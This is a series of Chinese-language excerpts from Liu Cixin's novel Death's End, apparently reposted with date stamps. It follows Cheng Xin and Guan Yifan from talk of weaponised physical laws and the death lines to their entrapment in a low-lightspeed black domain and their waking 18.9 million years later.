<p>海干了鱼就要聚集在水洼里，水洼也在干涸，鱼都将消失。所有的鱼都在这里吗？把海弄干的鱼不在。</p>
<p>对不起，这话很费解。把海弄干的鱼在海干前上了陆地，从一片黑暗森林奔向另一片黑暗森林。</p>
<p>“为了战争的胜利，竟要付出这样的代价吗？”程心说，她很难想象在降低一个维度的空间中生活是什么样子，在二维空间中，世界万物看上去只是几根长短不一的线段，在三维世界生活过的人，真的可能使自己生活在一张没有厚度的薄纸里吗？当然，三维空间的生活对四维世界的人来说也同样无法想象。程心得到的回答十分简单。</p>
<p>“总比死了强。”关一帆说。不顾程心的震惊，关一帆接着说下去：“光速也是被频繁使用的规律武器，但为自己建造光墓或你说的黑域不在此列，那只是我们这些弱小的虫子保命的举动，神们不屑如此。在战争中，可以制造低光速黑洞把敌人封死在里面；但更多还是用来防御，作为城墙和陷阱。有的低光速带规模之大，横穿整个星系旋臂，在恒星密集处，大量的低光速黑洞融为一体，连绵千万光年，那是星际长城，无论多么强大的舰队，一旦陷进去就永远出不来，这是很难逾越的障碍。”“这样下去会怎么样？”程心问。“维度攻击的结果，宇宙中二维空间的比例渐渐增加，终将超过三维空间，总有一天，第三个宏观维度会完全消失，宇宙变成二维的。至于光速攻击和防御，会使低光速区不断增加，这些区域最后会在扩散中连为一体，它们中不同的慢光速会平衡为同一个值，这个值就是宇宙新的C值；那时，像我们这样处于婴儿时代的科学就会认为，每秒十几千米的真空光速是一个铁一般的宇宙常数，就像我们现在的每秒三十万千米一样。当然，这只是举出两个例子，还有其他的宇宙规律被用做武器，但目前为止我们还不知道都有哪些，很可能，所有的规律都能被武器化了，在宇宙的某一部分，被用做武器的规律甚至可能包括……当然这只是瞎猜，太玄乎，我也不相信。”</p>
<p>“包括什么？”“数学规律。”</p>
<p>程心穷尽自己的想象，但仍然无法把握这不可思议的图景，连抓住其一角都难，“这也……太疯狂了！“宇宙会变成一座战争废墟吗？”程心问道，很快想到了一个更准确的表达，“或者说，自然规律会成为战争废墟吗？”</p>
<p>“可能已经是了……现在，新世界中的物理学和宇宙学只是在干一件事：试图恢复战争前自然规律的原貌。已经有了一个比较清晰的理论模型，描述那个没有被战争改变的宇宙。那真是一个美丽的田园，那个时代，距今有一百多亿年吧，被称为宇宙的田园时代。当然，那种美只能用数学来描述，我们不可能想象出那时的宇宙，我们大脑的维度不够。”程心又想起了那几句对话：</p>
<p>这片四维空间是你们建造的吗？你们说自己从海里来，海是你们建造的吗？</p>
<p>“你是说，田园时代的宇宙是四维的，那时的真空光速也比现在高许多？”“当然不是。田园时代的宇宙不是四维的，是十维。那时的真空光速也不是比现在高许多，而是接近无限大，那时的光是超距作用，可以在一个普朗克时间内从宇宙的一端传到另一端……如果你到过四维空间，就会知道那个十维的宇宙田园是个多么美好的地方。”“天啊，你是说……”</p>
<p>“我什么也没说。”关一帆说，像是突然醒来一样，“我们只看到了一点点实情，剩下的都是猜测，你也只把它当成猜测好了，一部我们编出来的暗黑神话。”但程心不为所动，径直沿着他刚才的思路说下去：“在田园时代以后的战争时代，一个又一个维度被从宏观禁锢到微观，光速也一级一级地慢下来……”</p>
<p>“我说过我什么也没说，都是猜测。”关一帆的声音渐渐低下去，“但谁也不知道，真相是不是比猜测更黑暗……有一点是肯定的：宇宙正在死去。”</p>
<p>2016-02-01</p>
<p>飞船的加速停止了，一切处于失重中。这之前，程心眼中的太空和星海越来越虚化，越来越像噩梦，只有这3G的超重才带来一些实在感，她像被一双有力的臂膀抱着，这种拥抱使她多少能够抵御宇宙的暗黑神话带来的寒冷和恐惧；现在超重消失了，只剩下噩梦。银河系像一大片掩盖血迹的冰渍，近处的DX3906恒星则像深渊上燃烧的焚尸炉。</p>
<p>“把全景显示关了好吗？”程心轻声说。关一帆关闭了显示，程心在瞬间由广袤的太空回到蛋壳般狭小的船舱中，在这里，她找回了一丝安全感。</p>
<p>“我不该对你说那些的。”关一帆说，他语气中的自责听起来很真诚。“我迟早要知道的。”程心说，声音仍然很轻。</p>
<p>“再说一遍，那都是猜测，没有真正的科学证明。不要想那么多，关注眼前的生活好了。”关一帆把手放到程心的手上，“我说的那些事，就算是真的，也都是以亿年为时间单位的。你到我们的世界去，那也是你的世界，在那里过你自己的生活。别再大幅度地跨越时间了，只要你把自己的人生限制在十万年内，把生活的范围限制在一千光年内，那些事就与你无关。十万年，一千光年，够了吧？”“够了，谢谢你。”程心握住了关一帆的手。</p>
<p>2016-02-01</p>
<p>“亨特”号泊入灰星的轨道，由于没有大气，飞船的运行轨道可以压到很低。飞船前往监视卫星提供的坐标位置，那是五架不明飞行器降落和起飞的地方。关一帆原本计划乘穿梭机在那里着陆，然后考察飞行器留下的痕迹，但他和程心都没有想到，神秘来访者留下的东西如此巨大，从太空中就能看到。</p>
<p>“那是什么？”程心指着灰星表面惊叫道。“死线。”关一帆说，他立刻认出了程心看到的东西，“注意不要太接近它！”他对A.I.说。</p>
<p>关一帆所说的死线是五根黑线，它们一端连着灰星的表面，另一端伸向太空。根据目测，每根线的长度大约在一百千米左右，已经高出了飞船的轨道，像灰星长出的五根黑色头发。“那是什么？”</p>
<p>“曲率驱动的航迹，那是超大功率的驱动，航迹内部的光速为零。”</p>
<p>2016-02-01</p>
<p>他们在0.2G的重力下向死线跳跃着走去。灰星的平原上覆盖着一层薄薄的粉尘，分布着大小不一的砾石，由于没有大气的散射，阳光下的阴影和亮区黑白分明。他们很快走到了距死线一百多米的地方，关一帆挥手示意程心停下。死线的直径达二三十米，从这里看它们更应被称为死柱。</p>
<p>“这可能是宇宙中最黑的东西了。”程心说。除了极深的黑色，死线没有显示出任何细节，它标志着零光速区的范围，应该没有表面。向上看，即使在漆黑的太空背景上，更黑的死线也仍然清晰可见。“也就是宇宙中最死的东西了。”关一帆说，“零光速是真正意义上的死亡，绝对的死，百分之百的死。在那里面，每个基本粒子，每个夸克，都死了，没有丝毫振动。即使死线的内部没有引力源，它也是一个黑洞，零引力的黑洞，任何东西进去后都不可能出来。”</p>
<p>关一帆拾起一块石头向一根死线扔过去，石头消失在死线的绝对黑色中。“你们的光速飞船能产生死线吗？”程心问。</p>
<p>“远远不能。”“那你们以前见过这个？”</p>
<p>“见过，见得不多。”程心仰望着这些伸向天空的黑色巨柱，它们顶起星空，仿佛把宇宙变成了死神的宫殿。这就是万物的归宿吗？她想。</p>
<p>天空中，程心能够看到死线的尽头，她指着那个方向问：“飞船到那里就进入光速了？”“是的，就上百千米的样子，我们以前见过的比这还短，进入光速就是一瞬间的事。”</p>
<p>“这就是最先进的光速飞船了？”“也许吧，但这种做法很少见，死线一般都是归零者们弄出来的。”</p>
<p>2016-02-01</p>
<p>归零者？”</p>
<p>“也叫重启者，可能是一群智慧个体，也可能是一个文明，或者几个文明，我们不知道，但已经确认它们的存在。归零者想重新启动宇宙，回到田园时代。”“怎么做呢？”</p>
<p>“把时针拨过十二点。比如说空间维度，把一个已经跌入低维的宇宙重新拉回高维，几乎不可能；但从另一个方向努力，把宇宙降到零维，然后继续降维，就可能从零的方向回到最初，使宇宙的宏观维度重新回到十维。”“零维？！你们见过把空间零维化？！”</p>
<p>“没有，只见过二维化，连一维化都没见过，但在什么地方肯定有归零者在做，谁也不知道是不是成功过。相对来说，把光速降到零容易一些，它们做得也比较多，试图把光速拨过零，来重现无限光速。”“这可能吗，从理论上说？”</p>
<p>“现在还不知道，也许归零者的理论认为可能。不过在我看来不可能，比如零光速，这是一道过不去的墙，零光速就是一切存在的绝对死亡，就意味着不可能再有任何运动。在这种状态下，主观不可能对客观产生任何作用，怎么可能把‘时针’继续向前拨呢？归零者做的事，更像是一种宗教，一种行为艺术。”程心看着死线，恐惧中多了敬畏，“如果它是航迹，为什么不扩散呢？”</p>
<p>2016-02-01</p>
<p>关一帆紧张地抓住程心的胳膊，“这正是我想说的。我们得赶快离开，不是说离开灰星，是离开这个星系，这里很危险。死线的状态与一般的曲率航迹不同，如果没有扰动它就会保持这个样子，也就是保持曲率引擎作用面的直径，但扰动出现它就会扩散，迅速扩散；像这样规模的死线，能扩散到一个恒星系大小，学者们把这个叫死线破裂。”</p>
<p>“扩散到的区域都是零光速？”“不不，死线扩散后就像普通的曲率航迹，内部不再是零光速，扩散越广内部的光速就越高，但仍然是每秒十几千米的低光速，所以说，这些死线扩散后，有可能把这个星系变成低光速黑洞，就是你们说的黑域……我们走吧。”</p>
<p>程心和关一帆转身向穿梭机跳跃而去。“你说的扰动是什么？”程心问，又回头看了一眼，在他们身后的平原上，五根死线的影子一直延伸到地平线处。</p>
<p>“现在还不太清楚，有理论认为是附近出现的其他曲率航迹，已经证明一定距离内的曲率航迹间有某种感应。”“那，‘星环’号加速时会不会……”</p>
<p>“所以，我们要用聚变推进远离后再启动曲率驱动，至少要离开——用你们的量度——四十个天文单位。”穿梭机起飞后，程心仍从监视画面中目不转睛地看着正在远去的死线，她说：“归零者，让我看到一些亮色。”</p>
<p>关一帆说：“宇宙是丰富多彩的，什么样的‘人’或世界都有。有归零者这样的理想主义者，有和平主义者，有慈善家，还有只专注于艺术和美的文明，但它们不是主流，不可能主导宇宙的走向。”“就像人类世界一样。”</p>
<p>“不过，对于归零者来说，它们的事业最终将由宇宙本身来完成。”“你是说宇宙的终结吗？”“是。”</p>
<p>“可据我知道的，宇宙将永远膨胀下去，越来越稀疏寒冷。”“那是你们的宇宙学，但我们推翻了这个结论。暗物质的量被低估了，宇宙将停止膨胀，然后在自身的引力下坍缩，最后成为一个奇点并再次大爆炸，把一切归零。所以你看，最终的胜利者还是大自然。”</p>
<p>“新的宇宙是十维的吗？”“不可能知道，有无穷的可能性，那是全新的宇宙，全新的生活。”</p>
<p>返回蓝星的航行与来时一样顺利，在大部分的时间里，程心和关一帆都在强制睡眠中度过。当他们被唤醒时，飞船已经泊入了蓝星的轨道。看着下面这蓝白相间的世界，程心竟有一种回家的感觉。这时，通信信道中传来了艾AA的呼叫声，关一帆做了回应。</p>
<p>“这里是‘亨特’号，出什么事了？”AA的声音很急：“我呼叫了你们好几次，都只有飞船回答，我怎么说它都不愿唤醒你们！”</p>
<p>“不是说过不要随便通信吗？出什么事了？”“出大事了！云天明来了！”</p>
<p>2016-02-01</p>
<p>你在说什么？”程心轻声说。“云天明来了！他的飞船三个多小时前就降落了！”</p>
<p>“哦——”程心机械地回应一声。“他还是那么年轻，像你一样年轻！”</p>
<p>“是吗？”程心感觉自己的声音像是从很远的地方传来的。“他还给你带来了一件礼物！”</p>
<p>“他已经给过我礼物了，我们就在他的礼物中。”“那算不了什么，我告诉你吧，这件礼物更好更棒，也更大……他现在出去了，我去找他来跟你说话！”</p>
<p>2016-02-01</p>
<p>关一帆插话进来说：“不用了，我们马上就下去了，这样通信有危险，我断了。”说完，他切断了通信。</p>
<p>他们长时间地对视着，最后都笑了起来。“我们真的醒了吗？”程心说。即使是梦，程心也想多流连一会儿。她启动了全景显示，星空看上去不再那么黑暗和寒冷，竟像雨后初晴一般充满了清澈的美丽，连星光都带着春天嫩芽的芳香，这是重生的感觉。</p>
<p>“进穿梭机，我们要尽快着陆。”关一帆说。他们进入了穿梭机，飞船开始执行穿梭机的脱离程序。在狭窄的舱内，关一帆在一个界面窗口中作再入大气层前的最后检查和测试。</p>
<p>“他怎么来得这么快？”程心用梦呓般的声音说。关一帆这时已经完全冷静下来，“这证实了我们的猜测：三体第一舰队在附近建立了殖民地，就在距这里一百光年的范围内。他们一定是收到了‘星环’号发出的引力波信号。”</p>
<p>穿梭机与飞船脱离，在监视画面上可以看到“亨特”号金字塔形的船体正渐渐远去。“什么礼物能比一个恒星系还大？”关一帆笑看着程心问道。</p>
<p>激动中的程心只是摇摇头。穿梭机的聚变发动机开始启动，外面的散热环发出红光，推进器在预热中，控制画面显示三十秒后减速开始，穿梭机的轨道将急剧降低，直到进入蓝星的大气层</p>
<p>2016-02-01</p>
<p>突然，程心听到了一阵尖厉的怪声，仿佛是穿梭机被一把利刃从头到尾划开，接着是剧烈的震动，然后，她便经过了怪异的一瞬间：怪异之处在于她不敢肯定这是一瞬间，这一刻既无限短，又无限长，她此时有一种跨越感，感觉自己在时间之外。后来关一帆告诉她，她经历了一段“时间真空”，那一刻的长短不可能用时间来计量，因为那一刻时间不存在。与此同时，她感觉自己在坍缩，似乎要变成一个奇点，这一刻，她、关一帆和穿梭机的质量变成无限大，然后，一切陷入黑暗。程心最初以为是自己的眼睛出了问题，她无法相信太空飞行器内部能变得这样黑，伸手不见五指。程心喊关一帆，但太空服的耳机中一片死寂。</p>
<p>关一帆在黑暗中摸索着，抱住了程心的头，她感觉自己的脸与他的脸紧紧贴在一起，她没有抗拒，只感到莫大的安慰。但她很快发现，关一帆这么做只是为了和她说话，因为太空服的通信系统关闭了，只有把两人头盔的面罩紧贴在一起，才能把声音传给对方。“不要怕，不要慌，一切听我的！现在不要动！”程心听到关一帆的声音从面罩里传来，凭接触的感觉她知道他肯定在大声喊，但她听到的声音很小，像是耳语。她感觉到他的另一只手在摸索着什么，很快舱内亮了起来。亮光来自关一帆手中一根香烟长短的条状物，程心知道那可能是一种化学发光体，“星环”号的应急装备中也有类似的东西，把它弯折后就能发出冷光。</p>
<p>“不要动，太空服已经不供氧了，减缓呼吸，我这就给舱内加压！不要怕，很快的！”关一帆说着，把发光条递给程心，自己则拉开座椅侧边的一个存储柜，从中拿出一个金属瓶，像一支小型灭火器，他在瓶口拧了一下，瓶中立刻喷出一股汹涌的白色气体。程心开始感到呼吸困难，她知道太空服的控制系统停止工作了，供氧也随即停止，她现在呼吸的只是头盔中的一点儿残氧。她的呼吸急促起来，越猛烈地吸气，窒息感来得越快。她本能地抬手想打开面罩，关一帆抓住她的手制止了她，又一把将她抱住，这一次是为了安慰她。她感觉他像是在抱着自己从深水向上浮，在发光条的冷光中，她看到了他的眼睛，那目光仿佛在告诉她就要到水面了。程心在太空服中也感觉到了外面上升的气压，就在她即将完全窒息时，关一帆猛地打开了她的面罩，然后把自己的也打开了，两人大口地呼吸着。</p>
<p>呼吸稍微舒缓一些后，程心注意到了那个金属瓶，她特别注意到瓶颈处的一个小仪表，那是气压表，程心发现那竟是一个古老的指针式气压表，现在指针已经滑到了绿区。关一帆说：“这些氧气也维持不了多长时间，这里很快还会冷起来，我们得赶快换太空服。”他起身飘离座椅，从舱的后部拉出了两只金属箱，他打开一只，程心看到了里面的太空服。不管是在太阳系还是在这里，现在的太空服都已经十分轻便，如果不戴头盔且内部不加压，再除去那个不大的生命维持箱，看上去与普通服装没有太大区别，但现在程心看到的这两套太空服却十分笨重，很像公元世纪的航天服。</p>
<p>他们的呼吸中出现了白色的水汽，程心脱下原来的太空服后，感到舱内寒冷刺骨。笨重的太空服穿起来十分吃力，关一帆帮着程心穿，她感觉自己就像个孩子，在这个男人面前，她有一种久违的依赖感。在戴上头盔前，关一帆仔细地给程心讲解这种太空服的用法，告诉她供氧开关、加压开关、温度调节旋钮、通信开关、照明开关等等分别都在什么位置。这种太空服没有任何自动装置，它的一切功能都需要手动。“这里面没有电脑芯片，现在，一切电脑，不管是电子的还是量子的，都不能启动了。”关一帆解释说。</p>
<p>“为什么？”“因为现在的光速，可能只有每秒十几千米。”</p>
<p>2016-02-01</p>
<p>关一帆为程心戴上头盔，这时，她的身体几乎冻僵了。关一帆为她打开了供氧开关，同时将电热系统也打开了，程心感觉太空服中渐渐暖和起来。这时，关一帆自己才开始换太空服，他穿得很快，戴上头盔后，费了一番周折才把两套太空服上的通信系统接通，但他们一时都冻得说不出话来，只能默默地等着自己的身体暖和过来。如果在1G的重力下，穿着这套笨重的太空服将很难移动，程心感觉它更像是一个小房子，是她现在唯一的栖息之处。飘浮在舱内的发光条已经暗了下来，关一帆打开了自己太空服上的照明灯。在狭窄的舱内，程心感觉他们像古代被困在井下的矿工。</p>
<p>“发生了什么？”程心问。关一帆从座椅上浮起来，在舱壁上吃力地拉动着什么，一个透明舷窗出现了——以前舷窗的内部挡板是自动开启的，人力拉开很费劲。接着，他在另一侧的舱壁上也拉开一个舷窗。</p>
<p>程心向外看去，发现宇宙已经完全变了。她首先看到处于太空两端的两个星团，前方星团发出蓝光，后方星团发出红光。在之前“星环”号的光速飞行中她见过这样的景象，但现在出现的两个星团不再是稳定的，它们的形状疯狂变幻，像两团狂风中的火焰。没有星星从前方的蓝色星团中蹦出，划过太空落进后方的红色星团，连接这宇宙两极的是两条光带，它们位于太空的两侧，从一个舷窗中只能看到一条，其中较宽的那条光带占据了近侧太空的一半，它的两端并没有与蓝红星团直接接触，而是在一段距离外形成两个尖圆的头部。程心能够看出这条宽光带其实是一个很扁的椭圆，或者说是被极端拉长的圆形。有大小形状不一的色块飞快地从宽带上移过，那些色块主要有三种颜色：蓝、白和淡黄——直觉告诉程心，这条光带就是蓝星。另一条光带更细更亮，它的表面上除了强光看不到细节，与蓝星不同，这条光带的长短在周期性地急剧变化，最长时成为一条连接蓝红两极的亮线，短时缩成一个明亮的圆球，后一形态暴露了它在正常时空中的原形，它就是DX3906恒星。“我们正以光速绕蓝星轨道运行，当然，是低光速。”关一帆说。</p>
<p>穿梭机的速度曾经高于这时的光速，但由于光速不可能超越，它的速度跌到了低光速。“死线扩散了？”</p>
<p>“是的，扩散到了整个恒星系，我们陷在这里了。”“是不是因为云天明飞船的扰动？”</p>
<p>“不知道，有可能吧，他不知道这个星系中有死线。”程心没有继续问下去，她不想问下一步怎么办，她知道很可能没什么可做的了。没有计算机能够在每秒十几千米的光速下运行，穿梭机的A.I.和各层控制系统全死了，在这种情况下，这架太空飞行器甚至连内部的一盏小灯都点不亮，它只是一个没有电和动力的金属罐子。“亨特”号飞船也一样成为了一艘死船。跌入低光速前，穿梭机还没有启动减速推进，飞船应该就在不远处，但就是紧靠着它也进不去，因为没有控制系统，穿梭机和飞船的舱门都打不开。</p>
<p>程心想到了云天明和艾AA，他们在地面上，应该是安全的，但现在双方已经无法联系，她甚至都没能和他说上一句话。这时，一个飘浮的物体轻轻撞在她的面罩上，是那个金属瓶，程心再次看到了上面的指针式气压表。她再摸摸自己的太空服，本来已经熄灭的希望之光又像萤火虫一般微微闪亮了。</p>
<p>2016-02-01</p>
<p>对这种情况有准备？”程心轻声问道。</p>
<p>“是的，有准备。”关一帆的声音从程心太空服的耳机中传出来，这是古老的模拟信号通信，声音有些畸变，“当然不是为死线扩散准备的，主要是考虑误入曲率驱动航迹的情况，那种情形和现在一样，低光速，什么都停了……下一步，咱们该启动神经元了。”“什么？”</p>
<p>“神经元计算机，能够在低光速下运行的计算机。穿梭机和飞船都有两套控制系统，其中一套就是神经元模式的。”程心很惊奇，竟然有能够在这样低的光速下运行的计算机。</p>
<p>“关键不是光速，而是体系模式，人脑中的化学信号传递更慢，只有每秒两三米，和人走路的速度差不多。神经元计算机就是模拟高等动物大脑的全并行处理，所用的芯片都是为低光速专门设计的。”关一帆打开一处金属面板，上面有一个标志，是许多点状物的复杂互联，每个点都像一只小章鱼一样伸出许多触手。一个小控制台露出来，上面有一台平面显示器，还有几个开关和指示灯，这些都是在危机纪元末就消失了的东西。关一帆按动一个红色开关，屏幕亮起来，没有显示图形界面，只有一堆文字提示，程心大概看出是一个操作系统的启动进程。</p>
<p>“现在神经元并行模式还没有建立起来，只能用串行方式载入操作系统。你真的没法想象低光速下的串行数据通信有多慢，看，只有每秒几百个字节，就连1K都不到。”“那启动是需要很长时间的。”</p>
<p>“是啊，不过随着并行模式的逐渐建立，载入速度会不断加快，但真的要花很长时间才能完成启动。”关一帆说着，指了指屏幕下方的一行提示。引导部分剩余时间68小时43分（跳动的秒数），总体剩余时间297小时52分（跳动的秒数）。“十二天！”程心吃惊地说，“那飞船呢？”</p>
<p>“飞船上有慢光速检测装置，可以自动启动神经元计算机，现在应该已经开始启动了，但完成的时间和这里差不多。”十二天，只有十二天后才能利用穿梭机和飞船中的生存资源，这期间只能靠这两件原始的太空服活着。如果太空服中的电源是核电池，应该能维持这么长时间，但氧气肯定不够。</p>
<p>“我们得冬眠。”关一帆说</p>
<p>2016-02-01</p>
<p>关一帆又从刚才拿出金属氧气瓶的存储柜中，取出了一个小盒，他打开小盒让程心看放在里面的胶囊。“这是短期冬眠药物，与以前的不同，不需要体外循环维持装置。冬眠后呼吸会降到极慢，耗氧非常少。一粒可以冬眠十五天左右。”</p>
<p>2016-02-01</p>
<p>你能看出上面的图形有周期吗？”关一帆问，他哪里也没看，半闭着双眼把自己束缚在超重座椅上。</p>
<p>“太快了，看不出来。”“目光随着它移动。”</p>
<p>程心照他说的做了，用目光快速跟着流动的宽带，那些蓝白黄的色块能瞬间看清一下，但很快又模糊了。“还是看不出来。”她说。“是啊，太快了，可能每秒重复几百次。”关一帆说完，默默地叹息，尽管他极力不让程心注意到自己的悲哀，她还是看出来了，她知道他悲哀的原因。</p>
<p>她知道，宽带上流动着的图形的每一个周期，都意味着穿梭机以光速围绕蓝星运行一圈。低光速下，狭义相对论魔鬼般的律法仍然有效，在那个参照系中，时间正以千万倍的速度闪电般地流逝，像从程心的心里流出的血。这一刻，沧海桑田。</p>
<p>2016-02-01</p>
<p>程心，”关一帆轻轻地唤了一声，“也许我们醒来时，看到那屏幕上显示着一条错误提示。”</p>
<p>程心转过头，透过面罩对他微微一笑，“我不怕的。”</p>
<p>2016-02-01</p>
<p>我当然知道你不怕，我只是想跟你说说话。我知道你作为执剑人的经历，只是想说，你没有错。人类世界选择了你，就是选择了用爱来对待生命和一切，尽管，要付出巨大的代价。你实现了那个世界的愿望，实现了那里的价值观，你实现了他们的选择，你真的没有错。”</p>
<p>“谢谢。”程心轻轻地说。“你后来的经历我不知道，但我相信你也没错。爱是没错的，一个人不可能毁灭一个世界，如果这个世界毁灭了，那是所有人，包括活着的和逝去的，共同努力的结果。”</p>
<p>“谢谢。”程心又说，热泪涌上眼眶。</p>
<p>2016-02-01</p>
<p>“至于下面发生什么，我同样也不怕。早在‘万有引力’号上的时候，星空就让我感到恐惧，感到累，我就想停下对宇宙的思考，但却像吸毒一样，停不下来。现在，可以停止了。”</p>
<p>“那很好，知道吗？我唯一怕的就是你会怕。”“我也是。”</p>
<p>他们的手拉在一起，在太阳的疯狂舞蹈中渐渐失去了意识和呼吸。</p>
<p>时间开始后约170亿年，我们的星星</p>
<p>2016-02-01</p>
<p>时间开始后约170亿年</p>
<p>我们的星星</p>
<p>2016-02-01</p>
<p>苏醒的过程很长，程心的意识是一点一点渐渐恢复的，当她的记忆和视力恢复后，知道的第一件事就是神经元计算机启动成功了。舱内被柔和的光照亮，各种设备发出的嗡嗡声清晰可闻，空气中有一种温暖的感觉，穿梭机复活了。</p>
<p>2016-02-01</p>
<p>程心用刚刚恢复知觉的手解开安全带，飘浮到关一帆身边，同他一起观看屏幕。他们都穿着太空服，但都没戴头盔，太空服紧紧挤在一起。屏幕上同时开着几个窗口，里面都滚动着大量的数据，正对穿梭机的各个系统进行检测。关一帆告诉程心，他已经与“亨特”号取得了联系，那里的神经元计算机也已经正常启动。</p>
<p>程心抬起头，看到两个舷窗仍然开着，她便飘了过去。为了让她看清楚外面，关一帆调暗了舱内的照明。现在，他们之间有一种默契，像一个人一样。</p>
<p>2016-02-01</p>
<p>发动机系统的检测基本正常，我们随时都可以减速脱出光速。”关一帆指着屏幕说。</p>
<p>“聚变发动机还能用？”程心问。在冬眠前，她心中就郁结着这个问题，但没有问，因为她知道多半会得到一个绝望的回答，她不想为难关一帆。“当然不能用了，低光速下的核聚变功率太低，我们要启动备用的反物质发动机。”</p>
<p>“反物质？！低光速下存放的容器……”“没有问题，反物质发动机是专为低光速环境设计的，像这样的远程航行，飞行器上都配备有低光速动力系统……我们的世界对低光速技术做了大量研究，目的并不是解决误入曲率航迹的问题，而是考虑到万一有一天不得不躲进光墓，或者说黑域中。”</p>
<p>2016-02-01</p>
<p>“那些线条是什么？！”程心惊叫道。</p>
<p>“应该是星星。”关一帆简单地回答说，同程心一样震惊。太空中的星星都变成了发光的细线。线状的星星程心似曾相识，她曾经多次见过长时间曝光的星空照片，由于地球的转动，照片上的星星都成了线段，它们的长短和方向都一样。但现在，星星变成的线长短不一，方向也不一样，最长的几根亮线几乎贯穿了三分之一的太空，这些亮线以种种角度相互交错，使星空看上去比以前迷乱了许多。</p>
<p>“应该是星星。”关一帆又说了一遍，“星光到达这里要穿过两个界面，首先穿过光速与慢光速的界面，然后穿过黑洞的视界，就变成了这个样子。”“我们在黑域里？”</p>
<p>“是的，我们在光墓里。”DX3906星系已经变成了低光速黑洞，与宇宙的其余部分完全隔绝了，那由纷繁的银线构成的星空，将永远是可望不可即的存在。</p>
<p>“我们下去吧。”关一帆打破长时间的沉默说。</p>
<p>2016-02-01</p>
<p>穿梭机再次减速，使轨道急剧降低，在剧烈的震动中进入蓝星大气层，向着这个程心和关一帆注定要度过一生的世界降落。</p>
<p>2016-02-01</p>
<p>没有“星环”号，没有云天明的飞船，没有任何人类的踪迹</p>
<p>2016-02-01</p>
<p>接下来，程心和关一帆只能开始做一件让他们深感恐惧、却又不得不做的事：确定现在的年代。低光速下的年代测定有一种特殊的方法，一些在正常光速的世界中不发生衰变的元素，在低光速下会出现不同速率的衰变，可由此精确测定低光速持续的时间。作为科学考察飞行器，穿梭机中有测定元素衰变的仪器，但它是一个独立的设备，没有神经元计算机控制系统，只有一个与穿梭机神经元主机的接口，关一帆费了很大周折，才使设备能够正常使用。他们让仪器依次测定从不同区域采集的十份岩石样本，以便于将结果进行对比。这个过程需要半个小时。</p>
<p>在等待测试结果时，程心和关一帆走出穿梭机，在林间空地中等待着。阳光透过林中的间隙，一缕缕地照进来。空地上有许多奇异的小生物飞过，有像直升机螺旋桨一样旋转着飞行的昆虫，还有一群群透明的小气球，借着浮力在空中飘行，穿过阳光时变幻出绚丽的虹彩；但没有见到长翅膀的生物。“也许已经有几万年过去了。”程心喃喃地说。</p>
<p>“也许比那更长。”关一帆望着森林深处说，“不过，现在，几万年，几十万年，有什么区别呢？”然后他们都沉默无言，相互依偎着坐在穿梭机的舷梯上，感受着彼此的心跳。</p>
<p>半个小时后，他们走上舷梯，去面对那个不得不面对的现实。控制台的屏幕上显示着十份样本的检测数据，检测了多种元素，是一份复杂的表格，所有样本的检测结果都极其接近，在表格下方，简明地列出了平均结果：样品1—10号检测元素平均衰变时间（误差：0.4%）：星际时间段：6177906；</p>
<p>地球年：18903729</p>
<p>2016-02-01</p>
<p>程心把最后一个数字的位数数了三遍，然后默默地转身走出穿梭机，走下舷梯，站在这紫色的世界中。一圈高大的紫树围绕在她周围，一缕阳光把小小的光斑投在她的脚边，温湿的风吹起她的头发，透明小气球轻盈地飘过她的头顶，一千八百九十万年的岁月跟在她身后</p>
<p>2016-02-01</p>
<p>关一帆来到程心身边，他们目光相对，灵魂交融。</p>
<p>“程心，我们错过了。”关一帆说。在DX3906星系的低光速黑洞形成一千八百九十万年后，在宇宙诞生一百七十亿年后，一个女人和一个男人紧紧拥抱在一起。</p>
<p>程心伏在关一帆的肩上痛哭起来，在她的记忆中，这种痛哭只在云天明的大脑与身体分离时有过一次，那是……18903729年再加六个世纪以前的事，而那六个世纪在这漫长的地质纪年中已经可以忽略不计了。但这次，她痛哭并非只为云天明，这是一种放弃，她终于看清了，使自己这粒沙尘四处飘飞的，是怎样的大风；把自己这片小叶送向远方的，是怎样的大河。她彻底放弃了，让风吹透躯体，让阳光穿过灵魂。他们坐到松软的腐殖叶上，继续默默地相拥着，任时间流逝。阳光穿过叶隙投下的光斑在他们身边悄悄移过。有时，程心问自己：是不是又过了一千多万年？她的意识中有一个奇怪的理智体，在悄悄告诉她那不是不可能，真的有随意跨越千年的世界。想想死线吧，如果它稍微扩散一点，内部的光速就由零变成一个极低值，比如像大陆漂移的速度，一万年一厘米。在这样的世界中，你从爱人的怀抱中起身，走出几步，就与他隔开千万年。</p>
<p>他们错过了。不知过了多长时间，关一帆轻声问道：“我们该干什么？”</p>
<p>“我想再找找，真的没有一点痕迹了？”“真的没有了，一千八百万年，什么都会消失的，时间是最狠的东西。”</p>
<p>“把字刻在石头上。”关一帆抬起头，迷惑地看着程心。</p>
<p>“艾AA知道把字刻在石头上。”程心像在自语。“我真的不明白……”</p>
<p>2016-02-01</p>
<p>飞船A.I.说明，遥感探测只能达到这样的精度，进一步需进行主动探测，需要穿梭机向地层中的相应位置发射探测波。</p>
<p>程心和关一帆激动地等待着，天黑下来了，周围的森林成了一圈剪影。天空中，星星的亮线开始出现，有几根较长的，像散落在黑天鹅绒上的银发。一个小时后，他们收到的遥感图像上显示了四行跨越了一千八百九十万年的字迹：</p>
<p>我们度过了幸福的一生我们送给你们一个小</p>
<p>在里面躲过坍缩去新</p>
<p>2016-02-01</p>
<p>飞船A.I.调用地质专家系统对探测结果进行了判读，从中可以知道：这些大字最初是刻在一块很大的山岩上，这是一块水成岩，刻字的一面面积约为一百三十平方米。在千万年漫长的地壳变动中，这块山岩所在的山峰下沉，这块巨岩也随之沉到现在地层中所在的位置。刻在岩面上的文字不止四行，但岩石在下沉过程中底部破碎，那些文字丢失了，现存刻字面的一角也破碎了，造成现有字迹的后三行都有残缺</p>
<p>2016-02-01</p>
<p>程心和关一帆再次拥抱在一起，他们都为艾AA和云天明流下了欣慰的泪水，幸福地感受着那两个人在十八万个世纪前的幸福，在这种幸福中，他们绝望的心灵变得无比宁静了。</p>
<p>“他们在这里的生活是什么样子？”程心泪光闪闪地问。“一切都有可能。”关一帆仰起头说。</p>
<p>“他们有孩子吗？”“一切都有可能，甚至，你信不信吧，他们曾在这颗行星上建立过文明。”程心知道这确实有可能，但即使那个文明延续了一千万年，后面的八百九十万年也足以抹去它的一切痕迹。</p>
<p>时间确实是最狠的东西。</p>
<p>2016-02-01</p>
